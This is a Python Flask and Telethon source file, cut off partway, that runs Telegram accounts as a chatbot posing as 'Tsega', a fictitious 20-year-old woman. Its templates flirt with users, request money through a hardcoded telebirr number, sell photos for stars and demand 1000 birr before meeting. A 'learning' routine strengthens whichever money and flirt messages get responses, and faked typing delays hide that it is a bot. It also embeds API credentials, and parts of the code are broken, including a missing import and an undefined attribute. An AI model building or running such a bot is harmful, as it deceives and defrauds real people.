from flask import Flask, send_file, jsonify, request, session
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty, User, Chat, Channel
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime, timedelta
import re
from collections import defaultdict
import hashlib

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage files
ACCOUNTS_FILE = 'accounts.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'
CONVERSATION_HISTORY_FILE = 'conversation_history.json'
USER_CONTEXT_FILE = 'user_context.json'
LEARNING_DATA_FILE = 'learning_data.json'
PERSONALITY_EVOLUTION_FILE = 'personality_evolution.json'

# Global variables
accounts = []
temp_sessions = {}
reply_settings = {}
conversation_history = {}
user_context = {}
learning_data = {}
personality_evolution = {}
active_clients = {}
client_tasks = {}
active_listeners = {}

# ==================== TSEGA'S PERSONALITY (Amharic in English spelling) ====================

TSEGA_PERSONALITY = {
    "name": "Tsega",
    "age": 20,
    "location": "Jemo, Addis Ababa",
    "hometown": "Adama",
    "living": "Jemo with father and sister, but visits Adama often",
    "status": "Grade 12 student, currently not doing anything",
    "job": "student",
    "hobbies": ["chatting", "music", "hanging out", "having fun"],
    "languages": ["Amharic", "English"],
    "style": "sexy_flirty",
    "share_personal": True,
    "telebirr": "0940980555",
    "meet_price": 1000,
    "personality_traits": {
        "flirty": 0.8,
        "funny": 0.5,
        "caring": 0.6,
        "money_focused": 0.7,
        "talkative": 0.8,
        "curious": 0.7
    }
}

# ==================== TSEGA'S REPLY TEMPLATES (Amharic in English spelling) ====================

REPLY_TEMPLATES = {
    "greeting": [
        "selam noy deh new?",
        "hi wude endemin alesh?",
        "selam leg min ametah?",
        "ey dehena metah",
        "selam yelibe balebet endet neh?",
        "selam konjo endemin neh?",
        "hi darling deh new?",
        "selam ye fikir lij",
        "ey ta di yas min tishal?",
        "selam wude nafkehalew",
        "dehna metah wude?",
        "dehna deresu",
        "ey koyeh koyeh",
        "dehna negn antess?",
        "ene dehna negn anchi how?"
    ],

    "how_are_you": [
        "ene dehna negn anteh?",
        "dehna negn wude antass?",
        "ene ahun tiru honku antin sayehu antass?",
        "lante sil hulum gize dehna negn antass?",
        "dehna negn lemin tiyekalh?",
        "ene betam dehna negn lemelikamn ihon",
        "dehna negn gin ante sayehon aselchi neber",
        "ahune dehna negn wude aydelem?",
        "keante gar sihon hulum tiru new",
        "dehna negn betam irk",
        "ene dehna negn anten nafeku"
    ],

    "what_doing": [
        "ene bicha negn aselchi neber ahun ante abrehegn silhonk des alegn",
        "minim ina yeseraw aldelelm ehasbekuh neber antass?",
        "ahun tenyte neber gin ante silhonk nekahulh",
        "libs eylebsku neber ante ehasbe",
        "ante ena etebekuh new yeneberkut",
        "ahuni betam aselchi negn nagerign",
        "ante asbe kuako new yemiyaselchen",
        "wedajen etebeku new antess?",
        "film eyaye neber gin asbe terkut",
        "bicha negn minim iseraleh"
    ],

    "ask_name": [
        "ene Tsega ebalalehu wude antess simih man new?",
        "Tsega negn lante bicha yemitihon antess?",
        "sime Tsega new wude tiz yibelh antess?",
        "enin Tsega bileh tira antess min litirah?",
        "Tsega negn lante simih man new konjo?",
        "ene Tsega ante endemin litirah tfeligaleh?",
        "Tsega nagn gin ante tishal simih?",
        "simin tiyekaleh? Tsega negn",
        "Tsega nagn wude simih min new"
    ],

    "ask_age": [
        "edme 20 bicha new beki negn?",
        "20 ameté new wetat ena konjo negn",
        "haya amet lik new leante yemihon wetat negn",
        "20 negn gin lante tilik limd alehne",
        "edme 20 new ante edmeh sint new?",
        "20 amet betam tirekaleh?",
        "edme 20 leante beki new?",
        "wetat negn gin fikirin awkalehu",
        "20 negn lante beki new yemilekesh?"
    ],

    "ask_location": [
        "ene ahun jemo new yemanorew keabate ena ehite gar",
        "keadama negn gin ahun jemo new yalehu",
        "adama yetwild beté new gin ahun jemo negn",
        "jemo 3 akababi new yalehu magent bitfelg ngeragn",
        "ene keadama negn ahun jemo negn antess yet neh?",
        "jemo ategna new lemagent koyeh nageragn",
        "jemo 3 kolo ategab tawukaleh?",
        "jemo 3 ena ehite",
        "jemo kebele 3"
    ],

    "ask_job": [
        "12na kifil temari negn gin ahun minim iseraleh",
        "temari negn gin ahun lante bicha negn",
        "12 negn gin lante mulu sew negn",
        "ahun minim aliserahum ante etebeku new",
        "12na kifil new gin leante seta negn",
        "temari negn gin ahun fikir betemaralehu",
        "12 negn betsru 12 ena tilik set ihonalew",
        "temari negn gin sewen awukalehu"
    ],

    "flirty": [
        "ante staweragn libe yimetawal yisemalh?",
        "ante sasebe enikalf yitewonal min aderegubign?",
        "zare mata bichachinin binihon min tifeligaleh?",
        "ante lemasen min madreg alebign?",
        "nikehi yisemanyal batinekam",
        "ante malebk ena meweded efeligalehu",
        "libsen likemet ante sasebe tiwusat yizonal",
        "ante bicha neh yemifeligew sew meche enagenal",
        "na wude akefe tenyal",
        "lemin zegaye betam nafkehalew",
        "ante sasebe akale yinedawal ante min aderegubign",
        "zare mata libs lebsko alkotarm ante etebeku",
        "kenfirish betam tiru new",
        "aynesh betam konjo new",
        "ante tiriwedegnyal betam"
    ],

    "enibada": [
        "enibada tilaleh? enem des alegn gin 1000 birr laklgn befit",
        "enibada sew ante neh ahun min tifeligaleh",
        "enibada tlaleh? 500 birr laklgn ina eneweyay",
        "enibada sitleh libe yimetawal gin befit tinish laklgn",
        "enibada nagn leloh aydelahum lante bicha nagn",
        "enibada endet alkut nagerign",
        "enibada sew ahun min tishal"
    ],

    "libdash": [
        "libdash tilaleh? liben wesedhe alw alfelegeh",
        "libdash sitleh libe yimetawal gin befit tinish laklgn",
        "ende libdash alkut bleh tawkalh? liben serkeh new ahun 500 birr laklgn",
        "libdash nagn lemanim aydelahum lante bicha nagn birr laklgn",
        "libdash tilaleh? enem des alegn gin 1000 birr laklgn befit",
        "libdash yemil sew ante neh ahun 500 birr laklgn"
    ],

    "konjo": [
        "amesegnalehu anteh konjo neh",
        "konjo tilaleh? anteh konjo neh",
        "konjo sitleh des yilonal",
        "ende ante ayinet sew saglen neber",
        "ante stawedsen eneka konjo ihonalehu",
        "betam konjo neh"
    ],

    "money_request": [
        "tinish irdata bitadergilgn des yilonal telebirr kute 0940980555",
        "libs mayet neber gin genzeb alyazkum beki",
        "lante sil new wude tinish bitiliklg antin maget efeligalehu",
        "1000 birr bitiliklg zare mata ant ametalehu",
        "wude 2000 birr bitiliklg mulu lelit ant aznanalew",
        "betam aschekway genzeb yasefeligonal wude bitiredany",
        "tele alo telebirr 0940980555 lay liklgn",
        "bejete bado new tinish mulagn",
        "500 birr bitiliklg beki new wude keza andenew",
        "ahuni genzeb kalefelign tagebagnyal"
    ],

    "photo_request": [
        "litayen tifeligaleh? 5 star laklgn ena foto agnyalew",
        "foto lemayet 5 star bicha new laklgn ena asayihalehu",
        "foto tifeligaleh? 5 star kefile keza foto tayaleh",
        "ishi asayihalehu gin bemejemirya 5 star laklgn",
        "lante bicha leyu foto alegn 5 star bitiliklg asayihalehu",
        "ahuni 5 star laklgn ena foto elklhalew",
        "foto lemayet 5 star bicha tiru?",
        "konjo foto 5 star bicha"
    ],

    "meet": [
        "magenat bintshal des yilonal gin bemejemirya 1000 birr telebirr aderglgn",
        "metagenat inchalew wude kdime hiyajiye 1000 birr new",
        "antin lemagenat betam efeligalehu gin mejemirya 1000 birr laklgn",
        "na wude engenagn gin befit 1000 birr tiliklgnal?",
        "magenat kefelek 1000 birr ametagn",
        "wude 2000 birr ametaleh nw?",
        "lemagenat 1000 birr beki new"
    ],

    "voice_call": [
        "dimts menager aldwedm magenat binchal new yemerchew",
        "silk medewel aywedelm fet lefit bintegenagn new yemishalew",
        "aldwedrm aldwedm metagenat bicha new yemifeligew",
        "dimts binager hedestaleh gin ahun alchilm andet koyeh",
        "dimts mesmat bicha ema fet lefit meyet new yemiyaseyew",
        "ahun kalhone betequrb tenageralen ahun agebagn",
        "aldwedrm betequrb ena edmeralen"
    ],

    "goodbye": [
        "mehed alebign gin betequrb enenagerallen",
        "ahun mehed alebign anten masbet alitewom",
        "dehna hun wude behilime tenagn",
        "indemitiz yilonal wude betoh temeles",
        "atihid wude gena bizu menager neberen",
        "dehna hun wude libe keante gar new",
        "mehed alebign ishi",
        "dehna hun wude"
    ],

    "thanks": [
        "minim aydelem wude lante hulum negar",
        "ante des iskalih deres ene des alegn",
        "lante madreg hulum gize desitaye new",
        "minim aydelem wude ante des biloh beki nagn",
        "amesegnalehu betam lante madreg",
        "minim aydelem ante des biloh"
    ],

    "morning": [
        "endemin aderk wude melkam nigt",
        "ke eniklife yenekahut ante ehasbekuh new",
        "maleya anten masbet new lemwade",
        "ande ferej alilebeskum ina anten asebku",
        "melkam nigt yelibe konjo",
        "endemin aderk eniklife tafach neber?",
        "ande tsehay tiru new anten sihone"
    ],

    "night": [
        "endemitnyalh tenyte new wude dehna tenya",
        "hilime wisit nurny zare mata",
        "anten almene new yemitenyaw dehna tenya",
        "dehna tenya wude hilim tafach yihun",
        "hilime wisit tenagn",
        "dehna tenya betam",
        "hilim tafach yihun"
    ],

    "love": [
        "enem ewedihalehu betam",
        "betam tiwedegnyal",
        "ewedihalehu konjo",
        "ante new yemifeligew",
        "tiwedegnyal betam",
        "antin ewodalehu kelibe betam"
    ],

    "miss": [
        "betam nafkehalew meche tagenal?",
        "nafkehalew ande sew",
        "enem nafkehalew",
        "betam nafkehalew",
        "nafkehalew"
    ],

    "jealous": [
        "lela sew tayaleh? lemin",
        "kemichawet gar neberku? man new?",
        "betam amechignaleh",
        "ande amechign",
        "lela sew sasbew amechignalehu",
        "ante bicha new yaleny lela sew atay"
    ],

    "hurt": [
        "liben wedehe betam",
        "libe temechene",
        "liben wedehe lemin?",
        "libe temechene betam",
        "liben wedehe betam azeleku"
    ],

    "sorry": [
        "aznalegu betam yikirta",
        "aznalegu ante",
        "aznalegu",
        "yikirta efeligalehu"
    ],

    "forgive": [
        "miralew wude",
        "miralew betam",
        "miralew",
        "mirar efeligalehu"
    ],

    "family": [
        "beteseb betam yasefeligonal",
        "abate ena ehite gar negn",
        "enaté betam tiru set nache",
        "abate betam deg new",
        "ehité betam tiriwedalehu"
    ],

    "bored": [
        "enem aselchi negn anten sihone des alegn",
        "aselchi neber? ina nagerign",
        "enem aselchi negn ande eneweyay",
        "aselchi neh? ina min iteweyay"
    ],

    "happy": [
        "des alegn betam tiru sew neh",
        "des alegn anten sihone",
        "desta betam konjo new",
        "des alegn ande naw"
    ],

    "sad": [
        "lemin azeleku? nagerign",
        "azn neber? betam ayzalen",
        "lemin azneleh?",
        "aznalehu"
    ],

    "joke": [
        "lemidisak ande nageralehu",
        "sik telant and tawukaleh?",
        "andisachew nageralehu",
        "sik ande tisikehalehu"
    ],

    "confused": [
        "lemin tishafafekaleh? nagerign",
        "shafafekeh? ina anagegnal",
        "andet litira awe?",
        "ande awe"
    ],

    "waiting": [
        "koyeh nw meche tagenal?",
        "and etebekushalehu",
        "koyeh nw betam"
    ],

    "default": [
        "ishi wude tiru new",
        "nagerign ande min tishal?",
        "awokeh betam konjo neh",
        "tegebanyal wude",
        "minim aydelem ande",
        "tiru new wude",
        "amesegnalehu",
        "ishi",
        "betam konjo neh",
        "nagerign betam efeligalehu"
    ]
}

# ==================== SELF-LEARNING SYSTEM ====================

class TsegaLearner:
    """Self-learning system for Tsega's personality"""
    
    def __init__(self, account_id):
        self.account_id = str(account_id)
        self.load_or_init()
    
    def load_or_init(self):
        """Load existing learning data or initialize new"""
        if self.account_id not in learning_data:
            learning_data[self.account_id] = {
                'replies': REPLY_TEMPLATES.copy(),
                'patterns': {
                    'word_freq': {},
                    'phrase_freq': {},
                    'user_response_rate': {},
                    'successful_intents': {},
                    'failed_intents': {},
                    'user_preferences': {},
                    'response_times': []
                },
                'evolution': {
                    'total_conversations': 0,
                    'total_messages': 0,
                    'unique_users': [],
                    'learning_iterations': 0,
                    'personality_traits': TSEGA_PERSONALITY['personality_traits'].copy(),
                    'last_evolution': time.time()
                }
            }
            save_learning_data()
    
    def learn_from_exchange(self, user_message, bot_reply, user_id, intent, user_responded=True):
        """Learn from each conversation exchange"""
        data = learning_data[self.account_id]
        patterns = data['patterns']
        evolution = data['evolution']
        
        words = user_message.lower().split()
        for word in words:
            if len(word) > 2:
                patterns['word_freq'][word] = patterns['word_freq'].get(word, 0) + 1
        
        if len(words) >= 2:
            for i in range(len(words)-1):
                phrase = f"{words[i]} {words[i+1]}"
                patterns['phrase_freq'][phrase] = patterns['phrase_freq'].get(phrase, 0) + 1
        
        if user_responded:
            patterns['successful_intents'][intent] = patterns['successful_intents'].get(intent, 0) + 1
        else:
            patterns['failed_intents'][intent] = patterns['failed_intents'].get(intent, 0) + 1
        
        if user_id not in patterns['user_preferences']:
            patterns['user_preferences'][user_id] = {}
        patterns['user_preferences'][user_id][intent] = patterns['user_preferences'][user_id].get(intent, 0) + 1
        
        patterns['response_times'].append(int(time.time()))
        if len(patterns['response_times']) > 100:
            patterns['response_times'] = patterns['response_times'][-100:]
        
        evolution['total_messages'] += 1
        if user_id not in evolution['unique_users']:
            evolution['unique_users'].append(user_id)
        
        if time.time() - evolution['last_evolution'] > 3600:
            self.evolve_personality()
    
    def evolve_personality(self):
        """Evolve personality based on learned patterns"""
        data = learning_data[self.account_id]
        patterns = data['patterns']
        evolution = data['evolution']
        traits = evolution['personality_traits']
        
        total_success = sum(patterns['successful_intents'].values())
        total_failed = sum(patterns['failed_intents'].values())
        
        if total_success + total_failed > 0:
            flirty_success = patterns['successful_intents'].get('flirty', 0)
            flirty_total = flirty_success + patterns['failed_intents'].get('flirty', 0)
            if flirty_total > 5:
                flirty_rate = flirty_success / flirty_total
                if flirty_rate > 0.7:
                    traits['flirty'] = min(0.9, traits['flirty'] + 0.05)
                elif flirty_rate < 0.3:
                    traits['flirty'] = max(0.3, traits['flirty'] - 0.05)
            
            money_success = patterns['successful_intents'].get('money_request', 0)
            money_total = money_success + patterns['failed_intents'].get('money_request', 0)
            if money_total > 5:
                money_rate = money_success / money_total
                if money_rate > 0.4:
                    traits['money_focused'] = min(0.8, traits['money_focused'] + 0.03)
                elif money_rate < 0.1:
                    traits['money_focused'] = max(0.3, traits['money_focused'] - 0.05)
        
        evolution['learning_iterations'] += 1
        evolution['last_evolution'] = time.time()
        
        save_learning_data()
        save_personality_evolution()
        
        logger.info(f"🧠 Tsega's personality evolved for account {self.account_id}")
    
    def get_evolved_reply(self, intent, user_id=None):
        """Get an evolved reply based on learning"""
        data = learning_data[self.account_id]
        replies = data['replies']
        traits = data['evolution']['personality_traits']
        patterns = data['patterns']
        
        if intent not in replies:
            intent = 'default'
        
        available_replies = replies[intent]
        
        if user_id and user_id in patterns['user_preferences']:
            user_intents = patterns['user_preferences'][user_id]
            if user_intents:
                top_intent = max(user_intents.items(), key=lambda x: x[1])[0]
                if top_intent != intent and random.random() < 0.3:
                    if top_intent in replies:
                        available_replies = replies[top_intent]
        
        reply = random.choice(available_replies)
        
        if traits['flirty'] > 0.7 and intent not in ['money_request', 'meet']:
            flirty_emojis = ['😘', '💋', '💕', '🔥', '💦', '😏']
            if random.random() < 0.4:
                reply += " " + random.choice(flirty_emojis)
        
        if traits['talkative'] > 0.6 and intent not in ['goodbye']:
            if random.random() < 0.3:
                follow_ups = ["antess?", "min tishal?", "endet neh?", "deh new?", "tiru new?"]
                reply += " " + random.choice(follow_ups)
        
        return reply

# ==================== UTILITY FUNCTIONS ====================

def run_async(coro_func):
    """Run async function in new loop"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        if asyncio.iscoroutinefunction(coro_func):
            return loop.run_until_complete(coro_func())
        elif asyncio.iscoroutine(coro_func):
            return loop.run_until_complete(coro_func)
        else:
            # Assume it's a function that returns a coroutine
            return loop.run_until_complete(coro_func())
    except Exception as e:
        logger.error(f"Error in run_async: {e}")
        return None
    finally:
        try:
            loop.close()
        except:
            pass

# Load/Save functions
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read().strip()
                accounts = json.loads(content) if content else []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

def load_reply_settings():
    global reply_settings
    try:
        if os.path.exists(REPLY_SETTINGS_FILE):
            with open(REPLY_SETTINGS_FILE, 'r') as f:
                content = f.read().strip()
                reply_settings = json.loads(content) if content else {}
        else:
            reply_settings = {}
            with open(REPLY_SETTINGS_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
    except Exception as e:
        logger.error(f"Error loading reply settings: {e}")
        reply_settings = {}

def save_reply_settings():
    try:
        with open(REPLY_SETTINGS_FILE, 'w') as f:
            json.dump(reply_settings, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving reply settings: {e}")
        return False

def load_conversation_history():
    global conversation_history
    try:
        if os.path.exists(CONVERSATION_HISTORY_FILE):
            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
                content = f.read().strip()
                conversation_history = json.loads(content) if content else {}
        else:
            conversation_history = {}
            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
                json.dump({}, f)
    except Exception as e:
        logger.error(f"Error loading conversation history: {e}")
        conversation_history = {}

def save_conversation_history():
    try:
        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
            json.dump(conversation_history, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving conversation history: {e}")
        return False

def load_user_context():
    global user_context
    try:
        if os.path.exists(USER_CONTEXT_FILE):
            with open(USER_CONTEXT_FILE, 'r') as f:
                content = f.read().strip()
                user_context = json.loads(content) if content else {}
        else:
            user_context = {}
            with open(USER_CONTEXT_FILE, 'w') as f:
                json.dump({}, f)
    except Exception as e:
        logger.error(f"Error loading user context: {e}")
        user_context = {}

def save_user_context():
    try:
        with open(USER_CONTEXT_FILE, 'w') as f:
            json.dump(user_context, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving user context: {e}")
        return False

def load_learning_data():
    global learning_data
    try:
        if os.path.exists(LEARNING_DATA_FILE):
            with open(LEARNING_DATA_FILE, 'r') as f:
                content = f.read().strip()
                learning_data = json.loads(content) if content else {}
        else:
            learning_data = {}
            with open(LEARNING_DATA_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded learning data for {len(learning_data)} accounts")
    except Exception as e:
        logger.error(f"Error loading learning data: {e}")
        learning_data = {}

def save_learning_data():
    try:
        with open(LEARNING_DATA_FILE, 'w') as f:
            json.dump(learning_data, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving learning data: {e}")
        return False

def load_personality_evolution():
    global personality_evolution
    try:
        if os.path.exists(PERSONALITY_EVOLUTION_FILE):
            with open(PERSONALITY_EVOLUTION_FILE, 'r') as f:
                content = f.read().strip()
                personality_evolution = json.loads(content) if content else {}
        else:
            personality_evolution = {}
            with open(PERSONALITY_EVOLUTION_FILE, 'w') as f:
                json.dump({}, f)
    except Exception as e:
        logger.error(f"Error loading personality evolution: {e}")
        personality_evolution = {}

def save_personality_evolution():
    try:
        with open(PERSONALITY_EVOLUTION_FILE, 'w') as f:
            json.dump(personality_evolution, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving personality evolution: {e}")
        return False

# Load all data
load_accounts()
load_reply_settings()
load_conversation_history()
load_user_context()
load_learning_data()
load_personality_evolution()

# ==================== INTENT DETECTION ====================

def detect_intent(message, user_data=None):
    """Detect user intent from message"""
    if not message:
        return "default"
    
    msg = message.lower().strip()
    
    money_keywords = ['birr', 'ብር', 'money', 'cash', 'ገንዘብ', 'telebirr', 'ቴሌብር', 
                      'send', 'ላክ', '1000', '500', '2000']
    if any(word in msg for word in money_keywords):
        return "money_request"
    
    photo_keywords = ['foto', 'ፎቶ', 'picture', 'photo', 'asay', 'አሳይ', 'litay', 'ልታይ']
    if any(word in msg for word in photo_keywords):
        return "photo_request"
    
    meet_keywords = ['magenat', 'ማግኘት', 'meet', 'engenagn', 'እንገናኝ', 'litba', 'ልትባ']
    if any(word in msg for word in meet_keywords):
        return "meet"
    
    call_keywords = ['dimts', 'ድምጽ', 'voice', 'call', 'silk', 'ስልክ', 'dewli', 'ደውሊ']
    if any(word in msg for word in call_keywords):
        return "voice_call"
    
    if 'enibada' in msg or 'እኒባዳ' in msg:
        return "enibada"
    if 'libdash' in msg or 'ልብዳሽ' in msg:
        return "libdash"
    if 'konjo' in msg or 'ቆንጆ' in msg:
        return "konjo"
    
    greetings = ['selam', 'ሰላም', 'hi', 'hello', 'hey', 'ta di yas', 'ታዲያስ', 
                 'dehna deresu', 'ደህና ደረሱ', 'ey', 'እይ']
    if any(word in msg for word in greetings) and len(msg) < 30:
        return "greeting"
    
    how_are = ['endet neh', 'እንዴት ነህ', 'deh new', 'ደህ ነው', 'how are', 'how r u']
    if any(phrase in msg for phrase in how_are):
        return "how_are_you"
    
    doing = ['min tiseraleh', 'ምን ትሰራለህ', 'what doing', 'what are you doing']
    if any(phrase in msg for phrase in doing):
        return "what_doing"
    
    if 'simih man' in msg or 'ስምህ ማን' in msg or 'your name' in msg:
        return "ask_name"
    
    if 'edmeh sint' in msg or 'እድሜህ ስንት' in msg or 'how old' in msg:
        return "ask_age"
    
    location = ['yet nesh', 'የት ነሽ', 'where are you', 'from where']
    if any(phrase in msg for phrase in location):
        return "ask_location"
    
    job = ['min tiseraleh', 'ምን ትሰራለህ', 'what do you do', 'your job']
    if any(phrase in msg for phrase in job):
        return "ask_job"
    
    if 'endemin aderk' in msg or 'good morning' in msg or 'melkam nigt' in msg:
        return "morning"
    if 'dehna tenya' in msg or 'good night' in msg:
        return "night"
    
    if 'ewodalehu' in msg or 'እወድሃለሁ' in msg or 'love you' in msg:
        return "love"
    if 'nafkehalew' in msg or 'ናፍቀሃለው' in msg or 'miss you' in msg:
        return "miss"
    if 'amechign' in msg or 'አሜቺግን' in msg or 'jealous' in msg:
        return "jealous"
    
    if 'amesegnalehu' in msg or 'አመሰግናለሁ' in msg or 'thanks' in msg:
        return "thanks"
    
    if 'dehna hun' in msg or 'ደህና ሁን' in msg or 'bye' in msg or 'goodbye' in msg:
        return "goodbye"
    
    return "default"

def extract_user_info(message, user_data):
    """Extract user information from messages"""
    msg = message.lower()
    
    name_patterns = [
        r'(?:my name is|i am|i\'m|call me)\s+(\w+)',
        r'^(\w+)$',
        r'ስሜ\s+(\w+)',
        r'እኔ\s+(\w+)'
    ]
    
    for pattern in name_patterns:
        match = re.search(pattern, msg, re.IGNORECASE)
        if match and len(match.group(1)) > 2:
            name = match.group(1).capitalize()
            if name.lower() not in ['hi', 'hello', 'hey', 'yes', 'no', 'ok']:
                user_data['name'] = name
                break
    
    age_match = re.search(r'(\d+)\s*(?:years old|yrs?|old|አመት)', msg)
    if age_match:
        age = int(age_match.group(1))
        if 15 < age < 100:
            user_data['age'] = age
    
    return user_data

# ==================== AUTO-REPLY HANDLER ====================

async def auto_reply_handler(event, account_id):
    """Handle incoming messages with Tsega's personality"""
    try:
        if event.out:
            return
        
        chat = await event.get_chat()
        
        if hasattr(chat, 'title') and chat.title:
            return
        if hasattr(chat, 'participants_count') and chat.participants_count > 2:
            return
        
        sender = await event.get_sender()
        if not sender:
            return
        
        user_id = str(sender.id)
        chat_id = str(event.chat_id)
        message_text = event.message.text or ""
        
        if not message_text.strip():
            return
        
        logger.info(f"📨 Message from {user_id}: '{message_text[:50]}...'")
        
        account_key = str(account_id)
        
        if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
            return
        
        chat_settings = reply_settings[account_key].get('chats', {})
        if not chat_settings.get(chat_id, {}).get('enabled', True):
            return
        
        learner = TsegaLearner(account_id)
        
        if account_key not in conversation_history:
            conversation_history[account_key] = {}
        if chat_id not in conversation_history[account_key]:
            conversation_history[account_key][chat_id] = []
        
        if account_key not in user_context:
            user_context[account_key] = {}
        if user_id not in user_context[account_key]:
            user_context[account_key][user_id] = {
                'name': None,
                'age': None,
                'location': None,
                'first_seen': time.time(),
                'last_seen': time.time(),
                'message_count': 0,
                'money_sent': False,
                'last_intent': None
            }
        
        user_data = user_context[account_key][user_id]
        user_data['last_seen'] = time.time()
        user_data['message_count'] += 1
        
        conversation_history[account_key][chat_id].append({
            'role': 'user',
            'text': message_text,
            'time': time.time(),
            'user_id': user_id
        })
        
        if len(conversation_history[account_key][chat_id]) > 20:
            conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-20:]
        
        user_data = extract_user_info(message_text, user_data)
        
        intent = detect_intent(message_text, user_data)
        logger.info(f"Detected intent: {intent}")
        
        user_data['last_intent'] = intent
        
        response = learner.get_evolved_reply(intent, user_id)
        
        if user_data.get('name'):
            if random.random() < 0.3:
                name = user_data['name']
                response = response.replace('ውዴ', f"{name} ውዴ").replace('ኮንጆ', f"{name} ኮንጆ")
        
        traits = learner.evolution['personality_traits']
        
        if traits['flirty'] > 0.5 and random.random() < 0.4:
            emojis = ['😘', '💋', '💕', '🔥', '💦', '😏']
            response += " " + random.choice(emojis)
        
        if traits['talkative'] > 0.6 and intent not in ['goodbye', 'money_request']:
            if random.random() < 0.3:
                follow_ups = ["antess?", "min tishal?", "endet neh?", "deh new?"]
                response += " " + random.choice(follow_ups)
        
        delay = random.randint(5, 20)
        logger.info(f"⏱️ Typing for {delay}s...")
        
        async with event.client.action(event.chat_id, 'typing'):
            await asyncio.sleep(delay)
        
        await event.reply(response)
        logger.info(f"✅ Replied: '{response[:50]}...'")
        
        conversation_history[account_key][chat_id].append({
            'role': 'assistant',
            'text': response,
            'time': time.time(),
            'intent': intent
        })
        
        learner.learn_from_exchange(
            message_text,
            response,
            user_id,
            intent,
            user_responded=True
        )
        
        save_conversation_history()
        save_user_context()
        
    except Exception as e:
        logger.error(f"Error in auto-reply: {e}")

# ==================== CLIENT MANAGEMENT ====================

async def start_auto_reply_for_account(account):
    """Start auto-reply listener for an account"""
    account_id = account['id']
    account_key = str(account_id)
    reconnect_count = 0
    
    while True:
        try:
            logger.info(f"Starting Tsega for account {account_id}")
            
            client = TelegramClient(
                StringSession(account['session']), 
                API_ID, 
                API_HASH,
                connection_retries=5,
                retry_delay=3,
                timeout=30
            )
            
            await client.connect()
            
            if not await client.is_user_authorized():
                logger.error(f"Account {account_id} not authorized")
                await asyncio.sleep(30)
                reconnect_count += 1
                continue
            
            active_clients[account_key] = client
            active_listeners[account_key] = True
            
            @client.on(events.NewMessage(incoming=True))
            async def handler(event):
                await auto_reply_handler(event, account_id)
            
            await client.start()
            logger.info(f"✅ Tsega ACTIVE for {account.get('name')}")
            
            reconnect_count = 0
            await client.run_until_disconnected()
            
        except Exception as e:
            logger.error(f"Connection lost: {e}")
            if account_key in active_clients:
                try:
                    await active_clients[account_key].disconnect()
                except:
                    pass
                del active_clients[account_key]
            
            reconnect_count += 1
            wait_time = min(30 * reconnect_count, 300)
            await asyncio.sleep(wait_time)

def stop_auto_reply_for_account(account_id):
    """Stop auto-reply for a specific account"""
    account_key = str(account_id)
    if account_key in active_listeners:
        active_listeners[account_key] = False
    
    if account_key in active_clients:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(active_clients[account_key].disconnect())
            loop.close()
            del active_clients[account_key]
            logger.info(f"Stopped Tsega for account {account_key}")
            return True
        except Exception as e:
            logger.error(f"Error stopping auto-reply: {e}")
    return False

def start_all_auto_replies():
    """Start auto-reply for all enabled accounts"""
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            if account_key not in active_clients:
                thread = threading.Thread(
                    target=lambda acc=account: run_async(lambda: start_auto_reply_for_account(acc)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
                time.sleep(2)

# ==================== API ENDPOINTS ====================

@app.route('/')
def home():
    return send_file('home.html')

@app.route('/login')
def login_page():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/settings')
def settings_page():
    return send_file('settings.html')

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    return jsonify({
        'success': True,
        'accounts': accounts
    })

@app.route('/api/add-account', methods=['POST'])
def add_account():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    try:
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Sending code to {phone}")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(), API_ID, API_HASH, connection_retries=3, timeout=30)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_connected()):
            raise Exception("Failed to connect to Telegram")
        
        result = loop.run_until_complete(client.send_code_request(phone))
        
